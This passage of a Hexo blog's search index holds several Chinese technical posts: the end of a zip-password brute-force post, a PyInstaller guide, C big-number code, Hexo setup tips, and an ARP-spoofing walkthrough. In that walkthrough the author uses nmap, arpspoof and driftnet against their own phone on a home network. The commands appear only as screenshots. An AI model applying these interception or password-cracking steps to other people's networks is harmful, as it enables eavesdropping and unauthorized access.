</p><p>我在这里创建了一个一到四位的纯数字密码做实验，字典里面也可以随意加入自己想测试的密码，但要注意字典的最后面要空一行。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/02.png"><br>0x03 测试</p><hr><p>我们先添加一个压缩文件，嗯，为了节约时间密码就设置成紫的年龄了。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/03.png">  </p><p>然后在压缩文件和字典的目录按shift+鼠标右键在当前目录打开命令行  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/04.jpg">  </p><p>然后测试一下，成功得到密码  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/05.png">  </p><p>实际上，真正用到暴力破解的时候不多，因为穷举法十分耗费时间，而且现今稍具严密度的密码验证机制都会设下试误的可容许次数以应对使用密码穷举法的破解者。当试误次数达到可容许次数时，密码验证系统会自动拒绝继续验证，有的甚至还会自动启动入侵警报机制。不过在面对弱口令的时候还是十分有效的。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>暴力破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用python pyinstaller打包python程序为exe</title>
    <link href="/2017/05/11/%E4%BD%BF%E7%94%A8python-pyinstaller%E6%89%93%E5%8C%85python%E7%A8%8B%E5%BA%8F%E4%B8%BAexe/"/>
    <url>/2017/05/11/%E4%BD%BF%E7%94%A8python-pyinstaller%E6%89%93%E5%8C%85python%E7%A8%8B%E5%BA%8F%E4%B8%BAexe/</url>
    
    <content type="html"><![CDATA[<h1 id="使用python-pyinstaller打包python程序为exe"><a href="#使用python-pyinstaller打包python程序为exe" class="headerlink" title="使用python pyinstaller打包python程序为exe"></a>使用python pyinstaller打包python程序为exe</h1><h2 id="0x01-为什么要把python程序打包成exe"><a href="#0x01-为什么要把python程序打包成exe" class="headerlink" title="0x01 为什么要把python程序打包成exe"></a>0x01 为什么要把python程序打包成exe</h2><p>自己写出的python程序在自己电脑上当然可以完美运行，可是当我们想提供给别人使用的时候，直接给他.py文件，多半是不行的，因为对方的电脑很可能没有python环境，就算有python环境，也可能没有这个程序所需要的库，所以最方便的办法是给对方一个exe文件。<br>0x02 安装python pyinstaller库</p><hr><p>在win下的命令行输入</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">pip install pyinstaller<br></code></pre></td></tr></table></figure><p>就会自动安装pyinstaller库，如果出现错误，可以尝试下更新自己的pip</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">pip install --upgrade pip<br></code></pre></td></tr></table></figure><h2 id="0x03-打包成exe"><a href="#0x03-打包成exe" class="headerlink" title="0x03 打包成exe"></a>0x03 打包成exe</h2><p>首先，我们在pyinstaller.exe（或pyinstaller.py）的目录下打开cmd，然后输入</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">pyinstaller.exe -F -c -i 你的图标.ico 你的python程序.py <br></code></pre></td></tr></table></figure><ul><li>-F是打包成一个独立的exe</li><li>-c是打包成控制台文件，如果不想让他显示命令行窗口，可以把-c换成-w</li><li>-i是加入你自己的图标，图标文件可以百度ico转换器来自己制作</li><li>后面的两个文件名分别为你的图标名和程序名，如果你的图标和程序不在当前目录，可以在他们前面分别加上各自的目录  </li></ul><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/pythonQQ%E5%9B%BE%E7%89%8720170511112907.png"></p><p>即可打包成功</p><p>这个时候exe文件被生成在dist文件夹中<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/pythonQQ%E5%9B%BE%E7%89%8720170511113043.png"></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arp入侵</title>
    <link href="/2017/05/06/arp%E5%85%A5%E4%BE%B5/"/>
    <url>/2017/05/06/arp%E5%85%A5%E4%BE%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="什么是arp入侵"><a href="#什么是arp入侵" class="headerlink" title="什么是arp入侵"></a>什么是arp入侵</h1><p>ARP毒化也被称为ARP缓存中毒和ARP欺骗攻击,这是在内网的中间人攻击。ARP欺骗采取的优势是通过ARP协议欺骗,达到对整个网络进行欺骗。<br>环境搭建</p><hr><p>首先，实验中所有主机在同一个局域网下，比如我的电脑，手机同时连接到寝室的wifi，他们就处于同一个局域网。<br>这次我使用的攻击者是电脑中安装有kali linux系统的虚拟机，受害者是我的手机。（这里用虚拟机做攻击者，就需要将虚拟机与主机连接模式改为桥接模式，具体方法百度上很多，就不在这里描述）<br>扫描局域网内存活主机</p><hr><p>我要攻击一个受害者，肯定要知道他的ip地址，而怎么能获取他的ip地址呢？这里就需要kali中的一个强大的工具——nmap。<br>这里我先查看自己虚拟机的ip地址和子网掩码，就能知道同一wifi下的主机的ip区间了。<br><img src="https://github.com/echohun/blog_image/blob/master/arp_jacking/arp01.png?raw=true" alt="查看自己的ip"><br>然后我发现自己的ip是192.168.0.108，子网掩码是255.255.255.0，所以我就知道了同一wifi下的主机肯定在192.168.0.1到192.168.0.255之间了。接下来就可以用nmap中的一个扫描方式扫描给定ip区间所有存活主机了。（nmap还有很多用途，可以去百度了解）<br><img src="https://github.com/echohun/blog_image/blob/master/arp_jacking/arp02.png?raw=true" alt="扫描存活主机"><br>这里扫出来六台主机，其中192.168.0.1是路由器地址，然后可以看到我的手机meizu对应的ip地址是192.168.0.103。<br>进行arp毒化</p><hr><p>接下来就是攻击过程了，首先开启linux的ip转发功能。<br><img src="https://github.com/echohun/blog_image/blob/master/arp_jacking/arp03.png?raw=true" alt="开启ip转发并检查一次"><br>下来这两句arpspoof指令是让手机发往路由器和路由器发往手机的数据先通过我的虚拟机（攻击者）再发送出去。这样他的所有数据都要通过我。<br><img src="https://github.com/echohun/blog_image/blob/master/arp_jacking/arp04.png?raw=true" alt="劫持"><br>接下来我们可以用个图片捕获工具driftnet来试试效果。<br>我的手机搜索蕾蒂西亚有关的图片<br><img src="https://github.com/echohun/blog_image/blob/master/arp_jacking/arp05.png?raw=true" alt="手机搜索"><br>然后用driftnet来查看<br><img src="https://github.com/echohun/blog_image/blob/master/arp_jacking/arp06.png?raw=true" alt="deiftnet窗口"><br>可以看到我们捕获到了手机正在搜索的图片，已经劫持成功了，我们可以做到的不止这些，kali中还有很多强大的工具可以去尝试。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>arp入侵</tag>
      
      <tag>nmap</tag>
      
      <tag>arpspoof</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用字符数组实现2的n次方（大数问题）</title>
    <link href="/2017/04/26/%E7%94%A8%E5%AD%97%E7%AC%A6%E6%95%B0%E7%BB%84%E5%AE%9E%E7%8E%B02%E7%9A%84n%E6%AC%A1%E6%96%B9%EF%BC%88%E5%A4%A7%E6%95%B0%E9%97%AE%E9%A2%98%EF%BC%89/"/>
    <url>/2017/04/26/%E7%94%A8%E5%AD%97%E7%AC%A6%E6%95%B0%E7%BB%84%E5%AE%9E%E7%8E%B02%E7%9A%84n%E6%AC%A1%E6%96%B9%EF%BC%88%E5%A4%A7%E6%95%B0%E9%97%AE%E9%A2%98%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="用字符数组实现2的n次方（大数问题）"><a href="#用字符数组实现2的n次方（大数问题）" class="headerlink" title="用字符数组实现2的n次方（大数问题）"></a>用字符数组实现2的n次方（大数问题）</h1><h2 id="为什么要用字符数组实现"><a href="#为什么要用字符数组实现" class="headerlink" title="为什么要用字符数组实现"></a>为什么要用字符数组实现</h2><p>在c/c++中，各个类型的数据的精度是有限的，我们可以写一个程序看看各种数据类型可以记录多大范围的数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;float.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;limits.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;char的位数:%u\n&quot;</span>,CHAR_BIT);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;char类型的最大值:%d\n&quot;</span>,CHAR_MAX);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;char类型的最小值:%d\n&quot;</span>,CHAR_MIN);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;short类型的最大值:%hd\n&quot;</span>,SHRT_MAX);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;short类型的最小值:%hd\n&quot;</span>,SHRT_MIN);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;int类型的最大值:%d\n&quot;</span>,INT_MAX);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;int类型的最小值:%d\n&quot;</span>,INT_MIN);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;long类型的最大值:%ld\n&quot;</span>,LONG_MAX);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;long类型的最小值:%ld\n&quot;</span>,LONG_MIN);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;unsigned long类型的最小值:%lu\n&quot;</span>,ULONG_MAX);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;float类型的尾数位数:%u\n&quot;</span>,FLT_MANT_DIG);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;float类型的最小有效数字位数:%u\n&quot;</span>,FLT_DIG);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;带有全部有效数字位数的float类型的负指数的最小值:%d\n&quot;</span>,FLT_MAX_10_EXP);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;带有全部有效数字位数的float类型的正指数的最大值:%d\n&quot;</span>,FLT_MIN_10_EXP);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;double类型的尾数位数:%u\n&quot;</span>,DBL_MANT_DIG);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;double类型的最小有效数字位数:%u\n&quot;</span>,DBL_DIG);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;带有全部有效数字位数的double类型的负指数的最小值:%u\n&quot;</span>,DBL_MAX_10_EXP);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;带有全部有效数字位数的double类型的正指数的最大值:%d\n&quot;</span>,DBL_MIN_10_EXP);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;long double类型的尾数位数:%d\n&quot;</span>,LDBL_MANT_DIG);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;long double类型的最小有效数字位数:%d\n&quot;</span>,LDBL_DIG);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;带有全部有效数字位数的long double类型的负指数的最大值:%d\n&quot;</span>,LDBL_MAX_10_EXP);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;带有全部有效数字位数的long double类型的正指数的最小值:%d\n&quot;</span>,LDBL_MIN_10_EXP);<br>&#125;<br></code></pre></td></tr></table></figure><p>运行以上代码就可以得到各种类型数据的范围，我们可以看出，如果要对整数进行运算，那么2的100次方就已经远远超出long long int所能存储的范围了，这时侯仍然使用long long int就会出错。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/a1.jpg"><br>如何实现</p><hr><p>这个时候，一个int存不下，但我们可以用很多个int串起来存，这个时候自然而然的想到了使用字符串，那么如何用字符串实现呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> x=<span class="hljs-number">2</span>;<span class="hljs-comment">//计算x的n次方</span><br><span class="hljs-keyword">int</span> a[<span class="hljs-number">1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//开一个长度为1000的数组</span><br><span class="hljs-keyword">int</span> b = <span class="hljs-number">0</span>;<span class="hljs-comment">//用来计算向前进的数字，并且第一个数得到的进位是零</span><br>a[<span class="hljs-number">999</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">int</span> n;<br><span class="hljs-built_in">cin</span> &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br><span class="hljs-keyword">int</span> j=<span class="hljs-number">999</span>;<br><span class="hljs-keyword">while</span>(j&gt;=<span class="hljs-number">0</span>)&#123;<br><span class="hljs-keyword">int</span> k=a[j]*x+b;<span class="hljs-comment">//这一位乘2之后加上进位</span><br>a[j]=k%<span class="hljs-number">10</span>;<span class="hljs-comment">//除以10取余，实际上是获取本位的数</span><br>b=k/<span class="hljs-number">10</span>;<span class="hljs-comment">//进位的数</span><br>j--;<br>&#125;<br>&#125;<span class="hljs-comment">//乘n遍的2</span><br><span class="hljs-keyword">int</span> s;<br><span class="hljs-keyword">for</span> (s=<span class="hljs-number">0</span>;s&lt;<span class="hljs-number">1000</span>;s++)<br>&#123;<br><span class="hljs-keyword">if</span>(a[s]!=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<span class="hljs-comment">//先循环到不是零的地方</span><br>&#125;<br><span class="hljs-keyword">for</span> (;s&lt;<span class="hljs-number">1000</span>;s++)&#123;<br><span class="hljs-built_in">cout</span>&lt;&lt;a[s];<br>&#125;<span class="hljs-comment">//从这里开始输出这个数组</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>具体实现方法注释中已经写的很明白了，其实就是循环n次乘法，不过每次乘法的每一位运算，都由自己写出的加法程序运算，这样就能在数组中保存这个大数。<br>const是用来保存一些全局常量的，这些常量在编译期可以改，在运行期不能改，听起来像宏，其实是用来取代宏的，所以在这里更改x的值，再重新编译，就可以计算其他数的n次冥。<br>这就是acm中常见的大数问题的一种解决方法，高精度加减乘除在CSDN上也有很多教程，感兴趣的朋友可以去看一看。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/a2.png">  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/a3.png"></p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>acm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>细数用github-pages和hexo搭建博客遇到的那些坑</title>
    <link href="/2017/04/08/%E7%BB%86%E6%95%B0%E7%94%A8github-pages%E5%92%8Chexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E9%81%87%E5%88%B0%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91/"/>
    <url>/2017/04/08/%E7%BB%86%E6%95%B0%E7%94%A8github-pages%E5%92%8Chexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E9%81%87%E5%88%B0%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<h1 id="细数用github-pages和hexo搭建博客遇到的那些坑"><a href="#细数用github-pages和hexo搭建博客遇到的那些坑" class="headerlink" title="细数用github-pages和hexo搭建博客遇到的那些坑"></a>细数用github-pages和hexo搭建博客遇到的那些坑</h1><p>上次搭建博客时，踩了很多坑，为了接下来搭建个人博客的朋友们在遇到同样的问题时能够少走弯路，我就在这里谈谈之前踩到的一些比较重要的坑和对应的解决办法  </p><p>搭建博客的具体过程我就不在赘述，有需要的朋友可以参考达壕的教程<a href="http://www.saberismywife.com/2016/06/27/%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B%E2%80%94%E7%94%A8github-pages%E4%B8%8Ehexo%E6%90%AD%E5%BB%BA%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E5%85%8D%E8%B4%B9%E5%8D%9A%E5%AE%A2/">详细教程—用github-pages与hexo搭建属于自己的免费博客</a></p><p>首先配置git环境和node.js的环境都没有出现问题，从官网上下载安装包安装完成就可以了，我遇到的第一个问题是hexo的安装：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">npm install hexo-<span class="hljs-keyword">cli</span> -g<br></code></pre></td></tr></table></figure><p>当在git-bush中输入以上代码时，长时间不进入下一步只能用ctrl+c退出。这里我一开始认为是node.js和git的版本出错，找了很多解决方法都不奏效，最后发现其实是npm官方镜像连不通，在这里只需要把源换成taobao的就可以，代码如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">npm<span class="hljs-built_in"> config </span><span class="hljs-builtin-name">set</span> registry <span class="hljs-string">&quot;https://registry.npm.taobao.org&quot;</span><br></code></pre></td></tr></table></figure><p>之后重新输入安装hexo的代码就可以<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/1.png"></p><p>第二个问题是在部署hexo的时候，出现如下错误：</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/2.png"></p><p>这个错误是因为hexo3.0后需要在_config.yml中设置 deploy中的type为git，这里需要在本地仓库输入以下代码：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install hexo-deployer-git <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>最后一个问题是在域名解析的时候，ping自己的github页面，返回地址可以当作A类解析指向的ipv4地址，但是这个地址有时会改变，会使域名解析失效：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/3.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/0004.png"><br>所以这里使用CNAME的解析方式更好，在你的github仓库创建一个CNAME文件，里面写着你的域名，然后再在你的域名提供商那里设置解析如下就可以解决问题</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/5.png"></p><p>第一次尝试的朋友应该还会犯很多错误，比如ssh-key的创建和使用过程的问题，还有因为readme.md文件没有同步到本地引发的一些git上传时候的错误，这些问题的解决方案百度有很多，都很容易解决。</p><p>冰心曾说:“成功的花,人们只惊慕她现时的明艳,然而当初它的芽儿,浸透了奋斗的泪泉,洒遍了牺牲的血雨”。尝试的道路上充满着荆棘，错误在所难免，希望这篇博客能帮到同样在尝试的你们。</p>]]></content>
    
    
    <categories>
      
      <category>搭建博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>搭建博客</tag>
      
      <tag>hexo</tag>
      
      <tag>github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客搭建完成了</title>
    <link href="/2017/04/03/hello-world/"/>
    <url>/2017/04/03/hello-world/</url>
    
    <content type="html"><![CDATA[<p>费了很多功夫，犯了很多错误，不过总算把博客搭建好了，以后会在这个博客里面上传一些平时学到的<br>东西，欢迎各位大佬来指导。</p>]]></content>
    
    
    <categories>
      
      <category>搭建博客</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
